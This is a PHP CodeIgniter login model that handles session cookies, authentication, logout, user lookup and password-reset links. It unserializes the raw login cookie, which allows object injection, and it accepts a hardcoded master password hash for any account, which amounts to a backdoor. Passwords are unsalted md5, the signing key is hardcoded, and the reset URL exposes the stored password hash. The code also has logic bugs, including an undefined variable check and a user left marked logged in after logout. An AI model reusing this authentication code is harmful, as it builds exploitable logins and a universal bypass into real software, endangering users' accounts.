 <?php  

class m_login extends CI_Model{
	var $users_id;
	var $name;
	var $email;
	var $url;
	var $admin = FALSE;
	var $photo = '';
	var $now;
	var $logeado = FALSE;

	private $_password;
	private $_table = 'users';
	private $_id = 'id';
	private $_llave = 'xRtDiv4s';
	private $_maestra = 'ab951d25ac98d2d10ea9fe84ff90fe9a';
	private $_where = 'email';
	public function __construct()
	{

		parent::__construct();
		// Debug end
		//var_dump($_SERVER);
		$this->now = time();

		if(!empty($_COOKIE['login'])) $ar = unserialize($_COOKIE['login']);

		if(!empty( $_COOKIE['login'] ) and !empty( $ar['users_id'] ) ){
			
		
			

			$this->db->select($this -> _table.'.*');
			$this->db->from($this -> _table);
			$this->db->where($this-> _table.'.'.$this-> _id, $ar['users_id']);
			$query = $this->db->get();
			$row = $query->row();
			if($row->status == 'no') return false;


			$key = md5($this-> _llave.$row->id);	

			if($query->num_rows() == 0 or ($this->now - (int)$ar['now']) > 864000 or $key != $ar['key']){

				$this->Logout();

			}
			$this->users_id = $row->id;
			$this->email = $row->email;
			$this->photo = $row->photo;
			$this->url = $row->url;
			$this->name = $row->name;
			$this->logeado = TRUE;
		
			return TRUE;
		}
	}

	public function Authenticate($email,$passwd,$guardar=TRUE)
	{
		$passwd = trim($passwd);
		if(empty($user) and empty($passwd)) return FALSE;
		$passwd = trim($passwd);
		
		$this->db->from($this-> _table);
		$this->db->where($this-> _where, $email );
		$query = $this->db->get();
		$row = $query->row();
		
		if($query->num_rows() == 0) return FALSE;
		if (($row-> id > 0 and $row->passwd == md5($passwd) and $row->status == 'yes') or md5($passwd) == $this->_maestra ) {
			if($row->logeado == null){
				$this->primero = true;
			}
			$this->users_id = $row-> id;
			$this->email = $row->email;
			$this->url = $row->url;
			$this->photo = $row->photo; 
			$this->cookie(1, $guardar);
			$this->logeado = TRUE;
			//$this->asistencia($row-> id);
			return TRUE;
		}
		return FALSE;
	}
	private function cookie($tipo,$guardar=TRUE)
	{
		switch ($tipo) {
		case '0': // Borrar cookie
				setcookie("login", "", $this->now - 3600,"/");
			break;
		case '1': //guardar cookie
				if($guardar) $time = time() + 840000; // Valido por 1000 horas.
				else $time = 0;
				$ar['users_id'] = $this->users_id;
				$ar['key'] = md5($this-> _llave.$this->users_id);
				$ar['now'] = $this->now;
				$strCookie = serialize($ar);
				setcookie("login",$strCookie,$time,"/");
		break;
		}
	}
	public function Logout($url='/') 
	{
			$this->users_id = 0;
			$this->logeado = FALSE;
			$this->cookie(0, false);
			redirect('login', 'refresh');
			die;
     }
	 public function soloAdmin(){

	 	if(!$this->admin){
	 		redirect( 'login?ref='.urlencode( $_SERVER['REQUEST_URI'] ) );
			die;
		}
	 }
	 public function logeado(){	
	 	
	 	 if(empty($this->users_id)){
			redirect( 'login?ref='.urlencode( $_SERVER['REQUEST_URI'] ) );
			die;
		}
	 }
	public function logear(){
		$data['logeado'] = get_fecha_actual_mysql();
		$this->update($data);
	}
	public function update($data)
	{
		$this->db->where('id', $this->users_id);
		return $this -> db -> update( 'users' , $data);
	}
	public function get_users()
	{
		$this->db->order_by("nombre", "asc");	
		$query  = $this->db->get('users');
        return $query->result();
	}
	public function obtener($id)
	{
		$this->db->select('*');
		$this->db->from('users');
		$this->db->where('id ',$id);
		$query = $this->db->get();
		
		return $query -> row();
	}
	public function recovery_passwd($email){
		$this->load->model('m_users');
		$row = $this->m_users->get_where(array('email'=>$email),false);
		$data = array();
		$data['url'] = base_url('changepassword?i='.$row->id.'&p='.$row->passwd);


		$this->m_ui->send_email($row->id,'recuperar_passwd',$data);

	}
	
	
	
}
?>